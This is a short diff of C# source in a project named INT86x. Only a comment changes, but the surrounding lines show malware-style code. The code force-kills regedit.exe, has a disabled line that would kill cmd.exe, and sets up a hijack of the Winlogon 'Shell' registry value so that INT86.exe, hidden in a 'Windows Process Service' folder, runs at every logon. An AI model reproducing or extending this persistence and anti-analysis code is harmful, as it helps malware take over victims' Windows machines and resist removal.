@@ -132,7 +132,7 @@ namespace INT86x
             cmd_func.cmd("taskkill", "/f /im regedit.exe");
             //cmd_func.cmd("taskkill", "/f /im cmd.exe");
 
-            /* register startup INT86 */
+            // startup INT86 register
             string startupPath = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
             string startupValueName = "Shell";
             string newValue = "explorer.exe, C:\\Program Files\\Windows Process Service\\INT86.exe";
